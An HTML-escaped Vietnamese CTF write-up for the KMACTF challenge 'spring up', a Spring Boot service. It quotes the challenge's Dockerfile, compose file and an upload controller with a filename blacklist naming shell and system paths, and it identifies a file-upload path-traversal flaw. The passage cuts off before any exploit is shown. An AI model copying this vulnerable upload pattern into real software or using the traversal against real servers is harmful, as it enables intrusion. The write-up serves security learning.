&lt;ul&gt;
&lt;li&gt;Flag: &lt;strong&gt;KMACTF{actually__this_flag-is_not_so_malicious_but_the_ipv6_is}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="spring-up"&gt;spring up
&lt;/h2&gt;&lt;h3 id="preface-1"&gt;Preface
&lt;/h3&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJasIAuiR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ÄÃ¢y lÃ  má»™t challenge Java Spring boot mÃ  Ä‘á»™ng Ä‘áº¿n kiáº¿n thá»©c mÃ  mÃ¬nh chÆ°a tá»«ng tÃ¬m hiá»ƒu, cho nÃªn quÃ¡ trÃ¬nh searching Ä‘á»ƒ tÃ¬m ra Ä‘Ãºng lá»— há»•ng lÃ  ráº¥t lÃ¢u, sau Ä‘Ã³ mÃ¬nh cÅ©ng ngá»‘n tiáº¿p hÆ¡n 2 tiáº¿ng Ä‘á»ƒ build file exploit nÃªn mÃ¬nh solve challenge nÃ y khi cuá»™c thi chá»‰ cÃ²n 1 tiáº¿ng, ngáº§n Ä‘áº¥y khÃ´ng Ä‘á»§ thá»i gian Ä‘á»ƒ tÃ¬m ra hÆ°á»›ng cho bÃ i web cuá»‘i cÃ¹ng.&lt;/p&gt;
&lt;h3 id="source-code-1"&gt;Source Code
&lt;/h3&gt;&lt;p&gt;Äáº§u tiÃªn xem xÃ©t Dockerfile, ta tháº¥y flag Ä‘Æ°á»£c move vá»›i kÃ½ hiá»‡u ngáº«u nhiÃªn, gá»£i Ã½ cho viá»‡c Ä‘á»ƒ solve challenge ta cáº§n pháº£i RCE:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;COPY flag.txt /flag.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RUN mv /flag.txt /flag_$(cat /dev/urandom | tr -dc &amp;#39;a-zA-Z0-9&amp;#39; | fold -w 32 | head -n 1).txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tiáº¿p tá»¥c Ä‘áº¿n docker compose, service spring boot Ä‘á»©ng sau 1 con reversed proxy nginx, vá»›i viá»‡c service backend phÃ­a sau Ä‘á»ƒ no-internet kháº³ng Ä‘á»‹nh khÃ´ng cÃ³ outbound ra ngoÃ i, loáº¡i bá» trÆ°á»ng há»£p sá»­ dá»¥ng curl/wget hay reverse shell khi RCE:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;version: &amp;#39;3&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; spring_up:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; container_name: spring_up
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; build: build
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; restart: always
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - no-internet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; nginx:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; image: nginx:1.27.0-alpine
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - &amp;#34;8080:80&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - ./build/nginx.conf:/etc/nginx/conf.d/default.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - spring_up
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - internet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - no-internet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; internet: {}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; no-internet:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; internal: true
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;FIle pom vÃ  config cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t nÃªn mÃ¬nh chuyá»ƒn qua Ä‘á»c web service controller luÃ´n.
Website chá»§ yáº¿u phá»¥c vá»¥ 3 route chÃ­nh, vÃ  Ä‘Æ°á»£c code bÃªn trong class FileController, chÃºng Ä‘á»u Ä‘Æ°á»£c báº¯t Ä‘áº§u báº±ng prefix path: &lt;code&gt;/file/&lt;/code&gt;
Route &lt;code&gt;/file/testUI&lt;/code&gt; khi GET Ä‘áº¿n sáº½ render file upload.html hiá»ƒn thá»‹ form upload file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;GetMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;testUI&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;testUI&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Form sáº½ gá»­i má»™t POST request Ä‘áº¿n route &lt;code&gt;/file/uploadResource&lt;/code&gt;, táº¡i Ä‘Ã¢y file Ä‘Æ°á»£c xá»­ lÃ½ vÃ  black list cháº·n má»™t sá»‘ prefix file nháº¥t Ä‘á»‹nh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;final&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;BLACK_LIST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;etc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;cron&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;bash&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;var&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;proc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;PostMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;uploadResource&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;uploadFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;RequestParam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;MultipartFile&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isEmpty&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;badRequest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Please select a file to upload.&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;File&lt;/span&gt; &lt;span class="n"&gt;theDir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;File&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;uploads/&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;theDir&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;theDir&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mkdirs&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getBytes&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;originalFilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getOriginalFilename&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;BLACK_LIST&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;originalFilename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BLACK_LIST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;badRequest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Blacklist!!&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;Path&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Paths&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;uploads/&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getOriginalFilename&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Files&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;OpenOption&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;File uploaded successfully: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="n"&gt;var6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var6&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Failed to upload file.&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Flow code cá»§a route nÃ y nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Khá»Ÿi táº¡o thÆ° má»¥c uploads náº¿u chÆ°a tá»“n táº¡i&lt;/li&gt;
&lt;li&gt;Láº¥y ná»™i dung cá»§a file qua method &lt;code&gt;MultipartFile.getBytes()&lt;/code&gt;, Ä‘á»“ng thá»i lÃ  filename báº±ng method &lt;code&gt;MultipartFile.getOriginalFilename()&lt;/code&gt; -&amp;gt; method nÃ y sáº½ láº¥y toÃ n bá»™ tÃªn file, bao gá»“m cáº£ path nÃªn táº¡i Ä‘Ã¢y ta xÃ¡c Ä‘á»‹nh lá»— há»•ng upload file + path traversal&lt;/li&gt;
&lt;li&gt;TrÆ°á»›c khi lÆ°u file sáº½ Ä‘Æ°á»£c kiá»ƒm tra xem cÃ³ chá»©a cÃ¡c kÃ½ tá»± blacklist khÃ´ng, náº¿u cÃ³ thÃ¬ sáº½ cook luÃ´ng&lt;/li&gt;
&lt;li&gt;Sau Ä‘Ã³ file Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c uploads, Ä‘á»“ng thá»i thÃ´ng bÃ¡o path ra ngoÃ i cho ngÆ°á»i dÃ¹ng&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NgoÃ i ra cÃ²n cÃ³ route &lt;code&gt;/file/downloadResource&lt;/code&gt; dÃ¹ng Ä‘á»ƒ download file tá»« thÆ° má»¥c uploads:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;GetMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;downloadResource&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
